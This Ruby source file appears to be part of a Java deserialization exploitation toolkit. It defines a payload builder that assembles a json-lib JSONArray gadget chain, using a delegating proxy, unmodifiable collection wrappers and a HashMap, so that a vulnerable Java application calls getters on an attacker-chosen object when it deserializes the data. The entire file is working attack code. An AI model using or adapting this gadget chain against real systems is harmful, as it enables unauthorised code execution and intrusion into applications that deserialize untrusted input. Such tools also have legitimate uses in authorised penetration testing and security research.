require_relative '../serialize'
require_relative 'util'

module Java
  module Serialize
    module Payloads
      module JSON
        # this payload normally is not of much use
        # it has a lot of dependencies, many of which contain gadgets as well
        def make_getter_caller(obj, cls)
          # this proxy prevents invoking getters that cause exception
          # before we get to the interesting ones
          invh = Java::Serialize::Payloads::Util.delegateproxy(obj)
          proxy = Java::Serialize::JavaProxy.new([cls[1..-2].tr('/', '.')], invh)

          ja = Java::Serialize::JavaObject.new('Lnet/sf/json/JSONArray;', 'elements' => Java::Serialize::JavaObject.new('Ljava/util/ArrayList;', 'elements' => [
                                                                                                                          Java::Serialize::JavaObject.new('Ljava/util/AbstractMap$SimpleEntry;', 'key' => nil,
                                                                                                                                                                                                 'value' => proxy)
                                                                                                                        ]))

          c1 = Java::Serialize::JavaObject.new('Ljava/util/Collections$UnmodifiableMap$UnmodifiableEntrySet;', 'c' => ja)

          c2 = Java::Serialize::JavaObject.new('Ljava/util/Collections$UnmodifiableSet;',
                                               'c' => ja)

          Java::Serialize::JavaObject.new('Ljava/util/HashMap;', 'elements' => { c2 => nil, c1 => nil })
        end

        module_function :make_getter_caller
        end
    end
  end
end
